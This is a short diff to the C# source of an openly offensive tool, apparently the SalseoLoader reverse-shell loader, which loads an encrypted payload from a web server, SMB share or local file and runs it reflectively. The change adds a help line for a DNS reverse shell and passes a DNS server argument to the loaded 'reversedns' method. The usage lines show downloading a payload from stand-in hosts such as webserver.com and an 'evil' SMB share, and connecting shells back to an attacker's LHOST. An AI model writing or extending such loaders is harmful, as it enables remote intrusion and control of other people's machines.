@@ -73,6 +73,7 @@ namespace SalseoDecrypter
                 Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT");
                 Console.WriteLine("    [-] SalseoLoader.exe password \\\\smbserver.com\\evil\\elfuckingmal.txt ReverseUDP LHOST LPORT");
                 Console.WriteLine("    [-] SalseoLoader.exe password c:\\temp\\elfuckingmal.txt ReverseICMP LHOST");
+                Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS");
                 Console.WriteLine("\n[+] Shells availables:\n\n    [-] ReverseTCP\n    [-] ReverseUDP\n    [-] ReverseDNS\n    [-] ReverseICMP");
                 System.Environment.Exit(1);
 
@@ -139,8 +140,8 @@ namespace SalseoDecrypter
             if (funcion == "reversedns")
             {
                 string LHOST = args[3].ToString();
-                string LPORT = args[4].ToString();
-                string[] argumentos = new string[] { LHOST + " " + LPORT };
+                string DNSServer = args[4].ToString();
+                string[] argumentos = new string[] { LHOST + " " + DNSServer };
                 Type myType = salsongo.GetTypes()[0];
                 MethodInfo Method = myType.GetMethod("reversedns");
                 object myInstance = Activator.CreateInstance(myType);
